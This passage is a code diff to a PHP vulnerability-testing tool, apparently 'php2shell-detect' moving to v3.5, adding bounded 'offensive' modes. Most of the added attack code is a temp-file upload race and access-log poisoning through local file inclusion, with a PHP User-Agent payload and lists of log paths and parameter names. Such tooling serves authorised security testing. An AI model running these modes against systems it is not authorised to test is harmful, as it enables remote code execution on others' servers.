+                    f_u = pp.submit(http_post, target, upload_body, headers_u,
+                                    timeout, insecure, 1024)
+                    f_c = pp.submit(http_post, target, body_c, headers_c,
+                                    timeout, insecure, 1024)
+                    f_l = pp.submit(http_get, url, timeout, ua, insecure)
+                    st_u, _, _ = f_u.result()
+                    st_c, _, _ = f_c.result()
+                    hdrs_l, b_l, st_l = f_l.result()
+                if b_l and rce_marker.encode() in b_l:
+                    return r_idx, True, f"{p}={tmp_path}", st_u, st_c, st_l
+                results.append({"tmp_path": tmp_path, "param": p, "status": st_l})
+        return r_idx, False, None, None, None, None
+
+    log(f"tmpfile-race: {rounds} rounds x 20 tmp-path guesses each", "step", quiet)
+    confirmed = False
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = [pool.submit(_race_round, r) for r in range(rounds)]
+        for i, fut in enumerate(as_completed(futures)):
+            r_idx, ok, via, st_u, st_c, st_l = fut.result()
+            out["race_attempts"].append({
+                "round": r_idx, "rce_confirmed": ok, "via": via,
+                "upload_status": st_u, "crash_status": st_c, "lfi_status": st_l,
+            })
+            if ok:
+                out["rce_confirmed"] = True
+                out["rce_via"] = via
+                confirmed = True
+            if sys.stdout.isatty() and not quiet:
+                progress(i + 1, rounds, "tmpfile-race")
+
+    if confirmed:
+        out["verdict"] = "vulnerable"
+        out["notes"].append(
+            "TMPFILE RACE RCE CONFIRMED. PHP temporary upload file (/tmp/php*) "
+            "was included via LFI before cleanup, and the planted PHP code "
+            "executed. This is a full RCE primitive that works even when no "
+            "session file is writable, as long as the LFI sink exists and the "
+            "crash primitive lingers temp files. Via: " + out["rce_via"])
+    else:
+        out["verdict"] = "safe"
+        out["notes"].append(
+            f"No temp file was included before cleanup across {rounds} rounds "
+            f"x 20 guesses (this run). The race window is tight — retry with "
+            f"more rounds or use --mode offensive-phpcode-exec-proof which "
+            f"targets the more reliable session-file vector.")
+    return out
+
+
+# ---------------------------------------------------------------- offensive: log-poisoning
+def offensive_log_poisoning(target, timeout, ua, insecure,
+                            include_path_candidates, log_paths, quiet=False):
+    """Offensive mode 9: PROVES RCE via access log poisoning + LFI.
+
+    PHP web servers log the User-Agent header in access logs. If we set
+    User-Agent to `<?php echo 'MARKER'; ?>` and the log file is then
+    included via LFI, the PHP code executes.
+
+    This mode:
+    1) Sends a request with PHP code in the User-Agent header (poisons the log)
+    2) Tries to include common log file paths via LFI sinks
+    3) If the marker appears without <?php tags, RCE is confirmed
+
+    Bounded: the poisoned User-Agent contains ONLY `<?php echo 'LOGRCE_xxx'; ?>`.
+    No system calls, no persistence, no data access.
+    """
+    rce_marker = "LOGRCE_" + uuid.uuid4().hex[:12]
+    out = {"mode": "offensive-log-poisoning", "target": target,
+           "rce_marker": rce_marker,
+           "log_paths_tried": log_paths or [
+               "/var/log/nginx/access.log",
+               "/var/log/apache2/access.log",
+               "/var/log/httpd/access_log",
+               "/var/log/access.log",
+               "/var/log/php/error.log",
+               "/var/log/php-fpm/error.log",
+               "/proc/self/fd/0",  # sometimes the stderr fd
+           ],
+           "poison_attempts": [], "rce_confirmed": False,
+           "rce_via": None, "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
+
+    # step 1: poison the access log by sending a request with PHP code in UA
+    poison_ua = f"<?php echo '{rce_marker}'; ?>"
+    # send several times to ensure it lands in the log
+    for _ in range(3):
+        http_get(target, timeout, poison_ua, insecure)
+    out["poison_ua"] = poison_ua
+
+    # step 2: try to include the log file via LFI
+    lfi_params = include_path_candidates or [
+        "include", "page", "file", "path", "template", "doc", "view", "module",
+    ]
+    confirmed = False
+    for lp in out["log_paths_tried"]:
+        for p in lfi_params:
+            url = f"{target.rstrip('/')}?{quote(p)}={quote(lp)}"
+            hdrs, b, status = http_get(url, timeout, ua, insecure)
+            entry = {"log_path": lp, "param": p, "status": status}
+            if not b:
+                entry["result"] = "no_body"
+                out["poison_attempts"].append(entry)
+                continue
+            text = b.decode("utf-8", "replace")
+            if rce_marker in text and poison_ua not in text:
+                entry["result"] = "RCE_CONFIRMED"
+                entry["evidence"] = "marker present, php tags absent → log poisoned + executed"
+                out["rce_confirmed"] = True
+                out["rce_via"] = f"{p}={lp}"
+                confirmed = True
+                break
+            elif rce_marker in text and poison_ua in text:
+                entry["result"] = "LOG_READ_BUT_NOT_EXECUTED"
+                entry["evidence"] = "log file readable but PHP code not executed"
+            elif poison_ua in text:
+                entry["result"] = "LOG_RAW_READ"
+                entry["evidence"] = "raw UA visible → log readable, code not parsed"
+            else:
+                entry["result"] = "not_found"
+            out["poison_attempts"].append(entry)
+        if confirmed:
+            break
+
+    if confirmed:
+        out["verdict"] = "vulnerable"
+        out["notes"].append(
+            "LOG POISONING RCE CONFIRMED. PHP code planted in the User-Agent "
+            "header was logged to the access log, and the log file was then "
+            "included via an LFI sink, executing the planted code. This is a "
+            "full RCE primitive that requires no file upload capability — only "
+            "an LFI sink and a readable log path. Via: " + out["rce_via"])
+    else:
+        out["verdict"] = "safe"
+        out["notes"].append(
+            "No log file was includable via LFI (this run). Either the log "
+            "paths are wrong, the LFI sink doesn't exist, or the log is not "
+            "readable by the web server user.")
     return out
 
 
@@ -1763,6 +2461,14 @@ def print_offensive(r):
         print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
         return
     print(f"  {C.WARN}BOUNDED OFFENSIVE — impact proof only{C.RST}")
+    # RCE-specific fields (new in v3.5)
+    if r.get("rce_confirmed"):
+        print(f"  {C.BAD}>>> RCE CONFIRMED <<<{C.RST}")
+        print(f"  {C.BAD}via: {r.get('rce_via') or r.get('deserialization_via') or r.get('filter_via')}{C.RST}")
+    elif r.get("rce_marker") or r.get("rce_via") is not None:
+        print(f"  rce_marker      : {r.get('rce_marker','?')}")
+        if r.get("rce_via"):
+            print(f"  rce_via         : {r['rce_via']}")
     if "marker" in r:
         print(f"  marker          : {r['marker']}")
     if "session_id" in r:
@@ -1771,9 +2477,19 @@ def print_offensive(r):
         print(f"  {C.BAD}marker observed via: {r['marker_observed_via']}{C.RST}")
     if r.get("probe_url"):
         print(f"  {C.BAD}probe URL: {r['probe_url']}{C.RST}")
+    if r.get("probe_extension"):
+        print(f"  bypass ext      : {r['probe_extension']}")
+    if r.get("phar_url"):
+        print(f"  phar URL        : {r['phar_url']} ({r.get('phar_size','?')}B)")
+    if r.get("filter_chain_reachable"):
+        print(f"  {C.BAD}filter chain REACHABLE — Synacktiv technique applies{C.RST}")
+    if r.get("deserialization_confirmed"):
+        print(f"  {C.BAD}phar deserialization CONFIRMED{C.RST}")
     if "markers_planted" in r:
         print(f"  markers planted : {r['markers_planted']}")
         print(f"  markers survived: {r['markers_survived']}")
+    if r.get("extensions_tried"):
+        print(f"  extensions tried: {r['extensions_tried']}")
     for n in r.get("notes", []):
         print(f"  {C.DIM}- {n}{C.RST}")
     print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
@@ -1820,7 +2536,10 @@ def build_summary(results):
            ("impact-session-poison", "impact-worker-leak",
             "impact-memory-disclosure", "asan",
             "offensive-session-lfi", "offensive-session-traversal",
-            "offensive-upload-bypass-verify", "offensive-race-poison-confirm")):
+            "offensive-upload-bypass-verify", "offensive-race-poison-confirm",
+            "offensive-phpcode-exec-proof", "offensive-filter-chain-rce",
+            "offensive-phar-deserialization", "offensive-tmpfile-race",
+            "offensive-log-poisoning")):
         summary["severity"] = "critical"
     elif n_vuln >= 2:
         summary["severity"] = "high"
@@ -1875,9 +2594,19 @@ def build_evidence_chain(results):
         elif mode == "offensive-session-traversal":
             detail = f"marker_via={r.get('marker_observed_via')}"
         elif mode == "offensive-upload-bypass-verify":
-            detail = f"probe_reachable={r.get('probe_url_reachable',False)}"
+            detail = f"probe_reachable={r.get('probe_url_reachable',False)} ext={r.get('probe_extension','?')}"
         elif mode == "offensive-race-poison-confirm":
             detail = f"survived={r.get('markers_survived',0)}/{r.get('markers_planted',0)}"
+        elif mode == "offensive-phpcode-exec-proof":
+            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
+        elif mode == "offensive-filter-chain-rce":
+            detail = f"filter_reachable={r.get('filter_chain_reachable',False)} via={r.get('filter_via')}"
+        elif mode == "offensive-phar-deserialization":
+            detail = f"deserialization={r.get('deserialization_confirmed',False)} via={r.get('deserialization_via')}"
+        elif mode == "offensive-tmpfile-race":
+            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
+        elif mode == "offensive-log-poisoning":
+            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
         else:
             detail = "see report"
         chain.append({"label": mode, "verdict": v, "detail": detail})
@@ -2147,7 +2876,7 @@ def build_parser():
                    help="Print full JSON to stdout (overrides human-readable)")
 
     p.add_argument("--version", action="version",
-                   version="php2shell-detect 3.4")
+                   version="php2shell-detect 3.5")
     return p
 
 
@@ -2170,7 +2899,12 @@ def requires_target(mode):
                     "impact-bounded-dos", "impact-memory-disclosure",
                     "offensive-session-lfi", "offensive-session-traversal",
                     "offensive-upload-bypass-verify",
-                    "offensive-race-poison-confirm")
+                    "offensive-race-poison-confirm",
+                    "offensive-phpcode-exec-proof",
+                    "offensive-filter-chain-rce",
+                    "offensive-phar-deserialization",
+                    "offensive-tmpfile-race",
+                    "offensive-log-poisoning")
 
 
 def is_impact_mode(mode):
@@ -2182,7 +2916,12 @@ def is_impact_mode(mode):
 def is_offensive_mode(mode):
     return mode in ("offensive-session-lfi", "offensive-session-traversal",
                     "offensive-upload-bypass-verify",
-                    "offensive-race-poison-confirm")
+                    "offensive-race-poison-confirm",
+                    "offensive-phpcode-exec-proof",
+                    "offensive-filter-chain-rce",
+                    "offensive-phar-deserialization",
+                    "offensive-tmpfile-race",
+                    "offensive-log-poisoning")
 
 
 def run_mode(mode, args, ua):
@@ -2281,6 +3020,33 @@ def run_mode(mode, args, ua):
                                                  rounds=max(args.rounds, 50),
                                                  workers=args.workers,
                                                  quiet=args.quiet)
+        if mode == "offensive-phpcode-exec-proof":
+            params = (args.include_params.split(",") if args.include_params else None)
+            return offensive_phpcode_exec_proof(t, timeout, ua, insecure, params,
+                                                args.quiet)
+        if mode == "offensive-filter-chain-rce":
+            params = (args.include_params.split(",") if args.include_params else None)
+            return offensive_filter_chain_rce(t, timeout, ua, insecure, params,
+                                              args.quiet)
+        if mode == "offensive-phar-deserialization":
+            params = (args.include_params.split(",") if args.include_params else None)
+            return offensive_phar_deserialization(t, timeout, ua, insecure,
+                                                  args.upload_endpoint or "",
+                                                  params,
+                                                  rounds=args.rounds,
+                                                  workers=args.workers,
+                                                  quiet=args.quiet)
+        if mode == "offensive-tmpfile-race":
+            params = (args.include_params.split(",") if args.include_params else None)
+            return offensive_tmpfile_race(t, timeout, ua, insecure, params,
+                                          rounds=max(args.rounds, 30),
+                                          workers=args.workers,
+                                          quiet=args.quiet)
+        if mode == "offensive-log-poisoning":
+            params = (args.include_params.split(",") if args.include_params else None)
+            log_paths = (args.log_files.split(",") if args.log_files else None)
+            return offensive_log_poisoning(t, timeout, ua, insecure, params,
+                                           log_paths, args.quiet)
         if mode == "generate-asan-repro":
             path = generate_asan_repro(args.asan_outdir or "./asan-output")
             return {"mode": "generate-asan-repro", "path": path,
